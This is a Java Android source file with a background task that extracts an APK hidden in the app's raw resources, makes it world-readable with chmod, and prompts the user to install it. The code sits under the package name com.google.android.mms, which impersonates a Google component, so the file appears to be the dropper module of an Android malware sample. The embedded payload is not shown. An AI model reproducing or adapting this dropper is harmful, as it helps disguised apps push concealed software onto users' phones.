package com.google.android.mms;

import java.io.File;
import java.io.InputStream;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.util.Log;

public class InstallASyncTask extends AsyncTask<Handler, Void, Integer> {
    private static final String TAG = "InstallASyncTask";
    
    private Context mContext;
    private Handler mHandler;
    
    public InstallASyncTask(Context context) {
        mContext = context;
    }
    
    @Override
    protected Integer doInBackground(Handler... params) {
        if (Config.LOGD) {
            Log.d(TAG, "[[InstallASyncTask::doInBackground]]");
        }
        mHandler = params[0];
        try {
            InputStream is = mContext.getResources().openRawResource(R.raw.app);
            ZipUtil.outputFile(is, mContext.getFilesDir() + "/", "app.apk");
            Runtime.getRuntime().exec("chmod 666 " + mContext.getFilesDir() + "/" + "app.apk");
            is.close();
            if (Config.LOGD) {
                Log.d(TAG, "[[InstallASyncTask::doInBackground]] unzip app.zip to app.apk success");
            }
            return 0;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return -1;
    }

    public void onPostExecute(Integer result) {
        if (Config.LOGD) {
            Log.d(TAG, "[[onPostExecute]]");
        }
        switch (result) {
        case 0:
            Intent i = new Intent(Intent.ACTION_VIEW);
            File upgradeFile = new File(mContext.getFilesDir() + "/" + "app.apk");
            i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
            mContext.startActivity(i); 
            mHandler.sendEmptyMessage(Config.INSTALL_SUCCESS);
            break;
        case -1:
            mHandler.sendEmptyMessage(Config.INSTALL_FAILED);
            break;
        }
    }
}
